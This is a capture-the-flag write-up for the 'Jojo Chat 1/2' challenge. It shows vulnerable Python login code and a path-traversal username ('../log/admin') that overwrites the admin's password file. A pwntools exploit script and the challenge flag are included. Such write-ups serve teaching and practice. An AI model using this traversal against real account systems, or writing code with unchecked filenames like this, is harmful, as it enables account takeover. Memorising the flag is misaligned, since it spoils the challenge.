## Jojo Chat 1/2

The kidnappers of Jojo have been developping their own chat platform.
We need you to get an admin access on it, in order to stop their evil activities.

**Author: algorab**

### Challenge description

The aim of this challenge is to find out how to pass admin on the application.

We have access to various functions, such as creating an account, logging in, viewing messages, sending a message, as well as to the program's source code. We need to find a vulnerability that allows us to become admin in order to access the `admin()` function, which we can see in the source code.

### Solution

It's all about creating the account. The `create_account()` function is as follows:

```python
def create_account():
    name = input("Enter your username: ")
    names = os.listdir("./log")
    while name in names:
        name = input("This username is already used! Enter another one: ")
    passwd = input("Enter a password: ")
    log = open(f"./log/{name}", 'w')
    log.write(f"Password : {hashlib.md5(passwd.encode()).hexdigest()}\n")
    print("\nAccount was successfully created!")
    log.close()
```

In addition, the `connect()` function is as follows:

```python
def connect():
    name = input("Username: ")
    names = os.listdir("./log")
    while not(name in names):
        input("This user does not exists! Username: ")
    log = open(f"./log/{name}", 'r+')
    hash_pass = log.readline().split(" ")[-1][:-1]
    return (hashlib.md5(input("Password: ").encode()).hexdigest() == hash_pass, name)
```

In other words, everything goes through the `log` file. By rewriting this file, you take control of the account!
Now we just need to find a way to do it. Note that no check is made on the account name when it is created, and that the log file is created directly by concatenating the address of the log file and the user name. It is therefore possible to create a slightly twisted path to rewrite the admin log file without actually creating an admin account.

```
Hey, welcom to j0j0 Chat! Feel free to chat with everyone here :)

Choose an option:
1) Create an account
2) Login
3) Leave
1
Enter your username: ../log/admin
Enter a password: iamadmin

Account was successfully created!

Choose an option:
1) Create an account
2) Login
3) Leave
2
Username: admin
Password: iamadmin

Choose an option:
1) See messages
2) Send a message
3) Logout
```

You can then log in as admin, and solve the last little game before accessing the flag!

```python
from pwn import *

host = sys.argv[1]
port = int(sys.argv[2])

conn = remote(host, port)

conn.recvuntil(b"3) Leave\n")
conn.sendline(b"1")
conn.recvuntil(b"username: ")
conn.sendline(b"../log/admin")
conn.recvuntil(b"password: ")
conn.sendline(b"iamadmin")
conn.recvuntil(b"3) Leave\n")
conn.sendline(b"2")
conn.recvuntil(b"Username: ")
conn.sendline(b"admin")
conn.recvuntil(b"Password: ")
conn.sendline(b"iamadmin")
conn.recvuntil("3) Logout\n".encode())
conn.sendline(b"admin")
print(conn.recvline().decode())
conn.close()
```

### Flag

`N0PS{pY7h0n_p4Th_7r4v3r54l}`

